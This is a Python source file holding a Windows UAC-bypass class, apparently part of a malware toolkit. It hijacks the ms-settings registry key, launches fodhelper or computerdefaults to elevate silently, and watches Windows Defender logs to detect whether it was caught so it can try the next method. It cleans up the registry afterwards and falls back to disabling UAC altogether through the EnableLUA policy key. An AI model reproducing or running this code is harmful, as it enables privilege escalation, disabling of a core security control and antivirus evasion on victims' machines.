import subprocess
import sys
import ctypes
import logging

logger = logging.getLogger(__name__)

class UACBypass:

    def __init__(self):
        pass

    def _is_admin(self) -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    def _get_self(self) -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    def _execute(self, cmd: str):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, check=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            logger.error(f"Command {cmd} failed with error: {e}")
            return ""

    def _set_registry_key(self):
        self._execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
        self._execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")

    def _cleanup_registry_key(self):
        self._execute("reg delete hkcu\Software\\Classes\\ms-settings /f")

    def DisUAC(self):
        def disable_uac():
            self._execute("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f >> NUL")

        def check_uac():
            uac = self._execute("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA")
            return "0x1" in uac

        if check_uac():
            disable_uac()
            return not check_uac()
        else:
            return True

    async def run_checks(self) -> bool:
        if not self._is_admin():
            logger.warning("Not running with administrative privileges.")
            return False

        if self._get_self()[1]:
            return await self._UAC_bypass()
        return True

    async def _UAC_bypass(self, method: int = 1) -> bool:
        commands = {
            1: "computerdefaults --nouacbypass",
            2: "fodhelper --nouacbypass"
        }

        self._set_registry_key()
        log_count_before = len(self._execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
        self._execute(commands.get(method, ""))
        log_count_after = len(self._execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
        self._cleanup_registry_key()

        if log_count_after > log_count_before and method in commands:
            return await self._UAC_bypass(method + 1)

        # If all bypass methods fail, attempt to directly disable UAC
        return self.DisUAC()